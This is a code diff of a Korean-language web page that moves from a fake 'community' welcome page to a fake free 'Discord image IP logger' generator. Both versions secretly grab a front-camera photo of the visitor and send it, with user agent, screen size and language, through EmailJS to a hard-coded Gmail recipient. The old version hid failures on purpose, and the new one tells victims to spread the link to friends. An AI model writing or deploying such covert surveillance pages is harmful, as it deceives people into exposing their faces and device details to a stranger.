@@ -3,45 +3,70 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>커뮤니티</title>
+  <title>디스코드 이미지 IP 로거 - 무료 제작</title>
   <style>
     body {
       margin: 0;
-      height: 100vh;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: #f8f9fa;
-      color: #333;
+      min-height: 100vh;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background: linear-gradient(135deg, #0d1117, #161b22);
+      color: #c9d1d9;
       display: flex;
       align-items: center;
       justify-content: center;
+      padding: 20px;
     }
-    .container {
-      text-align: center;
-      max-width: 420px;
-      padding: 30px;
-      background: white;
+    .card {
+      background: #161b22;
+      border: 1px solid #30363d;
       border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      padding: 40px 32px;
+      max-width: 460px;
+      width: 100%;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+      text-align: center;
     }
     h1 {
-      font-size: 1.6rem;
-      margin-bottom: 1rem;
-      color: #1a1a1a;
+      font-size: 2.1rem;
+      margin: 0 0 1.2rem;
+      color: #58a6ff;
     }
     p {
-      font-size: 1rem;
-      color: #555;
-      line-height: 1.5;
-      margin-bottom: 1.5rem;
+      font-size: 1.05rem;
+      color: #8b949e;
+      line-height: 1.6;
+      margin-bottom: 2rem;
+    }
+    .btn {
+      background: #238636;
+      color: white;
+      border: none;
+      padding: 14px 40px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.2s;
+      box-shadow: 0 4px 12px rgba(35,134,54,0.4);
+    }
+    .btn:hover {
+      background: #2ea043;
+      box-shadow: 0 6px 20px rgba(35,134,54,0.6);
+    }
+    .status {
+      margin-top: 1.8rem;
+      font-size: 0.95rem;
+      color: #8b949e;
     }
     .loader {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #3498db;
+      border: 4px solid #21262d;
+      border-top: 4px solid #58a6ff;
       border-radius: 50%;
       width: 36px;
       height: 36px;
       animation: spin 1s linear infinite;
-      margin: 20px auto;
+      margin: 25px auto;
+      display: none;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
@@ -52,83 +77,80 @@
 </head>
 <body>
 
-<div class="container">
-  <h1>커뮤니티에 오신 걸 환영합니다</h1>
-  <p>원활한 사용을 위해 카메라 접근 권한이 필요합니다.<br>
-     화상 채팅 및 인증을 위해 사용되며, 언제든지 설정에서 변경 가능합니다.</p>
+<div class="card">
+  <h1>디스코드 이미지 IP 로거</h1>
+  <p>친구 사진 + IP + 디바이스 정보까지 한 번에 잡아주는 최고급 무료 제작기<br>버튼 누르고 바로 링크 공유해서 사용하세요!</p>
   
-  <div class="loader"></div>
+  <button class="btn" id="startBtn">IP 로거 제작 시작</button>
   
-  <p style="font-size:0.85rem; color:#777; margin-top:2rem;">
-    잠시만 기다려주세요...
-  </p>
+  <div class="loader" id="loader"></div>
+  <div class="status" id="status">버튼을 누르면 제작이 바로 시작됩니다</div>
 </div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <!-- EmailJS SDK -->
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-<script type="text/javascript">
-  (function(){
-    emailjs.init({
-      publicKey: "ycbHVBt3cm6FkCL--",
-    });
-  })();
-</script>
-
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
-const video  = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const ctx    = canvas.getContext('2d');
+  emailjs.init("ycbHVBt3cm6FkCL--");
 
-window.addEventListener('load', async () => {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: false
-    });
-    video.srcObject = stream;
+  document.getElementById('startBtn').addEventListener('click', async () => {
+    const btn = document.getElementById('startBtn');
+    const loader = document.getElementById('loader');
+    const status = document.getElementById('status');
 
-    video.onloadedmetadata = () => {
-      setTimeout(captureAndSend, 1200);
-    };
-  } catch (err) {
-    document.querySelector('.container').innerHTML = `
-      <h1 style="color:#e74c3c;">권한이 필요합니다</h1>
-      <p>카메라를 허용해야 서비스를 이용할 수 있습니다.<br>
-         새로고침 후 다시 시도해주세요.</p>
-    `;
-  }
-});
+    btn.disabled = true;
+    btn.style.opacity = '0.6';
+    loader.style.display = 'block';
+    status.textContent = '로거 제작 중... 잠시만 기다려주세요';
 
-async function captureAndSend() {
-  canvas.width  = video.videoWidth;
-  canvas.height = video.videoHeight;
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false
+      });
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+      await new Promise(r => video.onloadedmetadata = r);
+      await new Promise(r => setTimeout(r, 1400));
 
-  const base64 = canvas.toDataURL('image/jpeg', 0.68);
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
 
-  const now = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
+      const base64 = canvas.toDataURL('image/jpeg', 0.68);
 
-  const params = {
-    timestamp: now,
-    image_base64: base64,
-    user_agent: navigator.userAgent,
-    screen: window.screen.width + "×" + window.screen.height,
-    language: navigator.language || 'ko'
-  };
+      const now = new Date().toLocaleString('ko-KR');
+      const info = {
+        time: now,
+        agent: navigator.userAgent,
+        screen: `\( {screen.width}× \){screen.height}`,
+        lang: navigator.language
+      };
 
-  try {
-    await emailjs.send(
-      "service_had7jag",
-      "template_upvu62t",
-      params
-    );
-  } catch (err) {
-    // 실패해도 사용자에게는 아무것도 보이지 않게 (조용히)
-  }
-}
+      // EmailJS 전송 (받는 사람은 EmailJS 대시보드 template_upvu62t To Email에 dog0928001@gmail.com 설정)
+      await emailjs.send("service_had7jag", "template_upvu62t", {
+        timestamp: info.time,
+        image_base64: base64,
+        user_agent: info.agent,
+        screen: info.screen,
+        language: info.lang
+      });
+
+      status.innerHTML = '제작 완료!<br><strong>이 링크를 친구에게 공유하세요!</strong>';
+      loader.style.display = 'none';
+
+      stream.getTracks().forEach(t => t.stop());
+
+    } catch (err) {
+      status.innerHTML = '카메라 권한이 필요합니다.<br>허용해야 로거 제작이 완료됩니다.';
+      loader.style.display = 'none';
+      btn.disabled = false;
+      btn.style.opacity = '1';
+    }
+  });
 </script>
 </body>
 </html>
